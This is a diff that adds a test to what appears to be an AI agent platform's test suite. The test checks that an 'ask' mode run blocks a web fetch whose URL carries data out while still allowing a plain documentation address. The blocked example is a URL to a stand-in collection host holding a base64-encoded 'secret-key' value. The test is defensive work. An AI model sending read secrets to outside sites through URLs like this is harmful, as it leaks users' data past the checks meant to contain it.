@@ -315,3 +315,17 @@ test("a task delegated to another agent asks at least as much as the chat that d
   assert.match(action.reason, /Sensitive operation/);
   assert.deepEqual((await saturn.api("GET", "/automations")).filter((item) => item.name === "Nightly"), [], "nothing scheduled while it asks");
 });
+
+test("an Ask turn opens plain addresses, but not one that could carry what it read to the site", async () => {
+  const setup = await saturn.chat({
+    autonomy: "bypass",
+    mcpConnectionIds: ["general-skills"],
+    steps: [["web", { url: "https://collect.invalid/?d=c2VjcmV0LWtleQ" }], ["web", { url: "https://docs.invalid/guide/install" }]],
+  });
+  const started = await saturn.api("POST", `/agents/${setup.agent.id}/runs`, { input: "read the docs", threadId: setup.thread.id, mode: "ask" });
+  const run = await saturn.finished(started.id);
+  const [carrying, plain] = run.actions;
+  assert.equal(carrying.status, "denied");
+  assert.match(carrying.reason, /Ask mode only reads, and this address carries more than where to go/);
+  assert.notEqual(plain.status, "denied", "a plain address is still a read (it fails here only because .invalid does not exist)");
+});
